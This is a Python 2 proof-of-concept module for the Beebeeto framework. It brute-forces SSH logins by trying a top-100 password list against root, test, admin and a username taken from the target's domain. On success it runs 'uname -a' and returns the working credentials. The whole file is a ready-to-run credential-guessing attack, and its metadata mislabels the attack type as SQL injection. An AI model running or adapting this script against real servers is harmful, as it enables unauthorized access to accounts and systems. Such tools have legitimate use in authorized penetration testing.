#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urlparse
import paramiko

import SETTINGS

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0022',
            'name': 'SSH Brute (暴力破解密码) POC',
            'author': '1024',
            'create_date': '2015-01-29',
        },
        # 协议相关信息
        'protocol': {
            'name': 'ssh',
            'port': [22],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'ssh',
            'vul_version': ['*'],
            'type': 'SQL Injection',
            'tag': ['SSH暴力破解工具', 'SSH Brute', 'SSH密码爆破'],
            'desc': '加载字典暴力破解SSH密码',
            'references': ['http://www.beebeeto.com',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        if not url.startswith(('http://', 'https://')):
            url = 'http://%s' % url
        target = urlparse.urlparse(url).netloc
        domain_user = target.split('.')[-2]
        # Using Beebeeto-framework /utils password_list
        password_list = open('%s/utils/payload/password_top100' % SETTINGS.FRAMEWORK_DIR)
        user_list = ['root', 'test', 'admin', domain_user]
        for pwd in password_list.readlines():
            for user in user_list:
                if args['options']['verbose']:
                    print '[*] Content host: ' + target
                    print '[+] User/Password: %s/%s' % (user, pwd)
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    client.connect(target, 22, username=user, password=pwd.strip(), timeout=8)
                    stdin, stdout, stderr = client.exec_command('uname -a')
                    args['success'] = True
                    args['poc_ret']['ssh_target'] = target
                    args['poc_ret']['ssh_user'] = user
                    args['poc_ret']['ssh_passwd'] = pwd.strip()
                    args['poc_ret']['ssh_uname'] = stdout.read()
                    client.close()
                    return args
                except Exception, e:
                    client.close()
                    if str(e) == 'Authentication failed.':
                        print '[-] Fail: %s\n\n' % e
                        continue
                    else:
                        args['success'] = False
                        args['exception'] = 'Failed to connect host/port.'
                        return args
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())